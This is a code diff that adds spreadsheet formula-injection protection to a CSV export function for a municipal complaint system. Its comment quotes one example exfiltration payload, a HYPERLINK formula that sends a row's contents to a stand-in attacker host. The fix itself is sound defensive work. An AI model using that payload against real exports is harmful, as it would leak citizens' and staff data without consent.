@@ -69,13 +69,36 @@ export function pluralize(count: number, singular: string, plural = `${singular}
   return `${count.toLocaleString()} ${count === 1 ? singular : plural}`;
 }
 
+/**
+ * Neutralises spreadsheet formula injection.
+ *
+ * RFC 4180 quoting alone does not help here: Excel, LibreOffice and Sheets
+ * all evaluate a cell whose *content* begins with `=`, `+`, `@` (or a control
+ * character that a leading formula can hide behind), and quoting is stripped
+ * before that decision is made. Since most of these columns are free text a
+ * citizen typed into the municipal website — `Description`, `Citizen`,
+ * `Location` — the person filling in the complaint form would otherwise get
+ * to choose what runs on a staff member's machine when they hit Export.
+ * `=HYPERLINK("http://attacker/"&A1,"click")` quietly exfiltrates the row.
+ *
+ * Prefixing a single quote is the standard mitigation: spreadsheet software
+ * reads it as "this cell is text" and does not display it. A leading `-` is
+ * left alone — it is ordinary in prose ("- broken since Monday") and does not
+ * evaluate on its own.
+ */
+function neutralizeFormula(text: string): string {
+  return /^[=+@\t\r]/.test(text) ? `'${text}` : text;
+}
+
 /** RFC 4180 escaping — quotes doubled, fields containing separators quoted. */
 export function toCsv(rows: Array<Record<string, string | number | null>>): string {
   if (!rows.length) return "";
   const headers = Object.keys(rows[0]);
 
   const escape = (value: string | number | null): string => {
-    const text = value === null || value === undefined ? "" : String(value);
+    const text = neutralizeFormula(
+      value === null || value === undefined ? "" : String(value)
+    );
     return /[",\n\r]/.test(text) ? `"${text.replace(/"/g, '""')}"` : text;
   };
 
